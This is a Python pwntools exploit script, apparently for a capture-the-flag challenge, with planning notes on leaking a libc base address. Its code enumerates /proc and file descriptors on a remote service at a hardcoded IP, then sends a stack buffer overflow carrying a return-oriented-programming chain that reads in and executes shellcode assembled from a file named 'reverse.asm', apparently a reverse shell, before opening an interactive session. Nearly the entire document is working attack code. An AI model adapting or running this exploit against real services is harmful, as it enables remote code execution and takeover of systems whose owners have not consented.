"""
1. Bruteforce v8 so that even if the buffer is overflowed, the sendstring function still sends the leaked data to the correct fd
2. If step 1 is successful, the address of __libc_start_main+234 is leaked. Calculate libc_base
3. ROP gadgets needed: pop rdi, ret; [/bin/sh]; system
4. pop rdi: 0x21102
5. /bin/sh: 0x18cd57
6. system: 0x45390
7. __libc_start_main: 0x20740
"""

"""
0. Remember to pad the payload because it will be truncated by 1 last byte.
1. List all procs to identify the processes that are lister because they are forked so they are using the same libc base.
2. payload can be built to write the correct fd and socket number (3 and 4 accordingly) so you still gonna get data back
3. ROP chain will be using system, /bin/sh, pop rdi and since the base is known, the addresses can be calculated

4. Just realized that the sockfd and clientfd will be overwritten when the buffer is overflowed, the sendstring function cannot send the data to the clientfd BUT the fd are not closed when main exits. We can reuse the fd to read the flag and write into the fd to retrieve the flag.

5. shell later
"""
from pwn import *
import string

context.arch = 'amd64'

HOST = "10.123.15.53"
PORT = 12345
#HOST = "localhost"
#PORT = 1234

libc = ELF('./libc-2.17.so')
#libc_base = 0x7fc0a14a6000
libc_base = 0x7fd9dcd83000
#libc_base = 0x7f3d28d33000

gadgets = {}
gadgets['system'] = libc.symbols['system']
gadgets['binsh'] = next(libc.search("/bin/sh\x00"))
gadgets['pop_rdi'] = 0x22298
gadgets['syscall'] = 0xc0065
gadgets['pop_rax'] = 0x1d150
gadgets['pop_rsi'] = 0x21738
gadgets['pop_rdx'] = 0x1b92
gadgets['xor_rax_rax'] = 0x8906f
gadgets['push_rax'] = 0xa5e8

context.log_level = 'ERROR'


def getDir(dirToList):
    print "Getting {}".format(dirToList)
    M = ""
    for i in range(0, 10):
        try:
            s = remote(HOST, PORT)
            #print s.recv()
            payload = '/' * i + '{}/'.format(dirToList)
            s.sendline(payload)
            m = ""
            while True:
                try:
                    c = s.recv(1)
                    m += c
                except:
                    break
            s.close()
            if "Directory does not exist" not in m:
                M = m
                break
        except:
            s.close()
    return M

def getProcesses():
    m = getDir("/proc").strip('\n').split('\n')
    m = [int(x) for x in m if not any(e in x for e in (string.ascii_letters + string.punctuation))]
    return m

def getFD(pid):
    m = getDir("/proc/{}/fd".format(pid))
    return m

def getMapFiles(pid):
    m = getDir("/proc/{}/map_files".format(pid))
    return m

def createHang():
    s = remote(HOST, PORT)
    return s

def setRDI(num):
    return p64(gadgets['pop_rdi']) + p64(num)

def setRAX(num):
    return p64(gadgets['pop_rax']) + p64(num)

def setRSI(num):
    return p64(gadgets['pop_rsi']) + p64(num)

def setRDX(num):
    return p64(gadgets['pop_rdx']) + p64(num)

def readBuf(addr, length, fd=4, skipfd=False):
    payload = ""
    payload += setRAX(0)
    if not skipfd:
        payload += setRDI(fd)
    payload += setRSI(addr)
    payload += setRDX(length)
    payload += p64(gadgets['syscall'])
    return payload

def writeBuf(addr, length):
    payload = ""
    payload += setRAX(1)
    payload += setRDI(4)
    payload += setRSI(addr)
    payload += setRDX(length)
    payload += p64(gadgets['syscall'])
    return payload

def openFile(addr, mode):
    payload = ""
    payload += setRAX(2)
    payload += setRDI(addr)
    payload += setRSI(mode)
    payload += setRDX(0) # no creation flags
    return payload

def main():
#    p = getProcesses()
#    s = createHang()
#    p1 = getProcesses()
#    diff = [int(x) for x in p1 if x not in p]
#    print diff
#    for pid in diff:
#        m = getMapFiles(pid)
#        print m
    for k in gadgets.keys():
        gadgets[k] += libc_base
        print k, hex(gadgets[k])
    shellcode = "/bin/sh\x00"
    shellcode += asm(open('reverse.asm').read())

    payload = 'A' * (320 - 8)
    payload += p64(0)
    payload += 'B' * 8 # rbp

    payload += readBuf(0x601000, len(shellcode) + 1) # read file name
    payload += p64(0x601000 + len("/bin/sh\x00") + 1)

    print len(payload)
    s = createHang()
    print s.recv()

    s.sendline(payload)
    s.sendline(shellcode)

    s.interactive()


if __name__ == '__main__':
    main()
